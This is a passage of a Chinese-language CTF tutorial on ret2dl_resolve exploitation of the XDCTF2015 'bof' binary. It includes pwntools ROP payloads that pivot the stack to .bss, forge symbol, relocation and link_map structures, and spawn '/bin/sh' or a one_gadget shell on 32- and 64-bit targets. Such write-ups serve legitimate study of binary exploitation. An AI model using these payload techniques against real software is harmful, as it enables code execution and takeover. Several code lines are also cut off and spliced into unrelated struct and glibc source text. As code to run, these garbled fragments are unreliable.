        write_plt = elf.plt['write']
        ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
        pop_ebp_ret = 0x0804861b
        leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"
        stack_size = 0x800
        bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
        base_stage = bss_addr + stack_size
        r = process('./bof')
        r.recvuntil('Welcome to XDCTF2015~!\n')
        payload = 'A' * offset
        payload += p32(read_plt) # 读100个字节到base_stage
        payload += p32(ppp_ret)
        payload += p32(0)
        payload += p32(base_stage)
        payload += p32(100)
        payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
        payload += p32(base_stage)
        payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
        r.sendline(payload)
利用第2阶段：
    cmd = "/bin/sh"
        plt_0 = 0x08048380   # objdump -d -j .plt bof
        rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
        index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
        write_got = elf.got['write']
        dynsym = 0x080481d8  #readelf -d bof     readelf -S bof
        dynstr = 0x08048278
        fake_sym_addr = base_stage + 36
        align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)# 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
        fake_sym_addr = fake_sym_addr + align
        index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
        r_info = (index_dynsym =2.2
            Elf32_Section st_shndx; // Section index
        } Elf32_Sym;
如下可见read函数的结构的值和参数意义：
目标：执行libc-2.23.so中的gadget 0x8fa05 : cmp byte ptr [eax], dl ; pop edi ; ret。
方法：伪造symtab条目，对比可知：
> fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)  
>  fake_sym = p32(0) + p32(fake_st_value) + p32(0) + p32(0x112)
>
> libc.symbos[' **libc_start_main']=0x18540  
>  fake_st_value=0x8fa05-0x18540=0x774C5  
>  fake_link_map=elf.got['**libc_start_main']=0x0804A018
st_name不需要管。
问题：如何伪造link_map?
伪造的link_map地址是libc_start_main的GOT表地址。通过跟踪dl_fixup
函数发现，dl_fixup引用了link_map+0x34/0x38/0x7c处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。
解决：提前往link_map+0x34/0x38/0x7c写入有效值。
有两种方法：
##### 方法1——3个值不变
代码可参考 **stage6_libc1.py** 。
其实就是 x/100xw GOT[4]即可发现3个偏移处原本的值，利用read把3个值写到对应偏移处。
##### 方法2——3个值构造
代码可参考 **stage6_libc2.py** 。
把link_map+0x34/0x38/0x7c处的值记作val_0x34，val_0x38，val_0x7c，也即[link_map+0x34/0x38/0x7c]。跟踪发现，是这样寻找的：
> [val_0x34+4]==STRTAB dynstr  
>  [val_0x38+4]==SYMTAB dynsym  
>  [val_0x7c+4]==JMPREL rel_plt
可以把dynstr、dynsym、rel_plt这3个地址都设置为同一个值base_stage（val_0x34=val_0x38=val_0x7c=base_stage+80-4，[base_stage+80]=base_stage），这样布置bss段伪造栈就更简洁。
* * *
## 3.64位dl_resolve
#### （1）原理
区别：结构体变化 & 寄存器传参。
##### 1.64位relocation entry的结构体定义如下（24 bytes）：
    typedef __u16   Elf64_Half;
        typedef __u32   Elf64_Word;
        typedef __u64   Elf64_Addr;
        typedef __u64   Elf64_Xword;
        typedef __s64   Elf64_Sxword;
        typedef struct elf64_rela {
          Elf64_Addr r_offset;  /* Location at which to apply the action */
          Elf64_Xword r_info;   /* index and type of relocation */
          Elf64_Sxword r_addend;    /* Constant addend used to compute value */
        } Elf64_Rela;
        #define ELF64_R_SYM(i) ((i) >> 32) #define ELF64_R_TYPE(i) ((i) & 0xffffffff)
    #roputils中，64位下构造伪Elf64_Rela的代码如下
        ...
                r_info = (((addr_sym - symtab) / syment) st_other), 0) == 0)
            {
              const struct r_found_version *version = NULL;
              if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
            {
              const ElfW(Half) *vernum =
                (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
              version = &l->l_versions[ndx];
              if (version->hash == 0)
                version = NULL;
            }
这里，应该是由于我们构造的伪symbol的index过大，使得`vernum[ELFW(R_SYM)
(reloc->r_info)]`读取出错。所以只需令`l->l_info[VERSYMIDX (DT_VERSYM)] ==
NULL`，也即将`link_map+0x1c8`处设为NULL。
所以，需先泄露GOT[8]，再修改`*(GOT[8]+0x1c8)==null`。
#### （2）64位dl_resolve构造模板
参见代码`stage6_original.py`。
主要4点变化：JMPREL条目构造、SYMTAB条目构造、JMPREL偏移参数->下标、link_map+0x1c8处写0。
#### （3）64位roputils库使用
参见代码`dl-resolve-x86-64.py`。
步骤：
  1. 泄露&link_map地址（万能gadget）
  2. 往bss段写入ROP链和伪造的结构（万能gadget）
  3. 跳到bss段，bss段ROP先往link_map+0x1c8写0; 同时往bss段写入伪造结构。
#### （4）64位执行libc任意gadget——不用泄露地址
目标：执行libc-2.23.so中的gadget 0x8eb46 : cmp byte ptr [rax], dl ; ret。
方法：伪造symtab条目，对比可知：
> fake_sym = p32(st_name) + p32(0x12) + p64(0) + p64(0)  
>  fake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)
>
> libc.symbos[' **libc_start_main']=0x20740  
>  fake_st_value=0x8eb46-0x20740=0x6E406  
>  fake_link_map=elf.got['**libc_start_main']=0x601038
st_name不需要管。
##### 问题1：如何伪造link_map?
伪造的link_map地址是libc_start_main的GOT表地址。通过跟踪dl_fixup
函数发现，dl_fixup引用了link_map+0x68/0x70/0xf8处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。
解决1：提前往link_map+0x68/0x70/0xf8写入有效值。
有两种方法。
##### 问题2：l_addr+r_offset处必须可写。
解决2：l_addr这里的值是libc_start_main
地址，那么我们可以控制好r_offset即可。r_offset=libc['.bss']-libc.symbols['libc_start_main']。
##### 方法1——3个值不变
代码可参考`stage6_libc1_64.py`，这个代码的目标是不泄露地址，然后执行gadget 0x8eb46 : cmp byte ptr
[rax], dl ; ret。 如果想看执行onegadget获得shell的话可以把0x8eb46改成onegadget
0xf1147，或者直接试试附件的示例。
其实就是 x/100xw GOT[8]即可发现3个偏移处原本的值，利用read把3个值写到对应偏移处。
##### 方法2——3个值构造
代码可参考`stage6_libc2_64.py`，这个代码的目标是不泄露地址，然后执行gadget 0x8eb46 : cmp byte ptr
[rax], dl ; ret。如果想看执行onegadget获得shell的话可以把0x8eb46改成onegadget
0xf1147，或者直接试试附件的示例。
把`link_map+0x68/0x70/0xf8`处的值记作val_0x68，val_0x70，val_0xf8，也即`[link_map+0x68/0x70/0xf8]`。跟踪发现，是这样寻找的：
> [val_0x68+4]==STRTAB dynstr  
>  [val_0x70+4]==SYMTAB dynsym  
>  [val_0xf8+4]==JMPREL rel_plt
可以把dynstr、dynsym、rel_plt这3个地址都设置为同一个值base_stage（val_0x68=val_0x70=val_0xf8=base_stage+0xc0-8，[0xc0]=base_stage），这样布置bss段伪造栈就更简洁。
参考：